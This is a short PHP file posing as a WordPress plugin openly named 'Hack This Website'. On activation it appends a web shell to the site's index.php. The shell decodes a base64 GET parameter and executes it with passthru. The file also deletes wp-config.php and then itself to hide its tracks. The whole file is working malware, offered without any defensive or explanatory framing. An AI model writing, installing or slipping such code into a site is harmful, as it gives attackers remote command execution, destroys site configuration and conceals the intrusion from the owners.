<?php
/*
  Plugin Name: Hack This Website
*/

$payload = <<<'BADSTUFF'
if (!empty($_GET['n4v4ac'])) {
  $command = base64_decode($_GET['n4v4ac']);
  passthru($command);
}
BADSTUFF;

register_activation_hook( __FILE__, function() use ($payload) {
    file_put_contents(__DIR__ . '/../../../index.php', $payload, FILE_APPEND);
    unlink(__DIR__ . '/../../../wp-config.php');
    unlink(__FILE__);
} );
